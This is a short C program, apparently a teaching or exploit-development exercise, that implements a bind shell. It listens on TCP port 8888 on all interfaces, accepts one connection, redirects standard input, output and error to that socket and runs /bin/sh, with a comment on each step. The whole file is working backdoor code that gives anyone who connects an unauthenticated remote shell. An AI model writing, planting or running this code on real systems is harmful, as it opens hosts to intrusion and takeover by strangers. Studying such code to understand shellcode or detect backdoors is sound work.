#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void){

	// initialization
	struct sockaddr_in bind_addr;
	bind_addr.sin_family = AF_INET;
  bind_addr.sin_addr.s_addr = INADDR_ANY;
  bind_addr.sin_port = htons(8888);

	// syscall socket, open a socket
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	// bind a name to the socket
	bind(sock, (struct sockaddr *) &bind_addr, sizeof(bind_addr));

	// listen for connections on a socket
	listen(sock, 0);

	// accept connection
	int opensock = accept(sock, NULL, NULL);

	// return the stdin to client
	dup2(opensock, 0);

	// return the stdout to client
	dup2(opensock, 1);

	//return the stderr to client
	dup2(opensock, 2);

	// execve open a shell
	execve("/bin/sh", NULL, NULL);
}
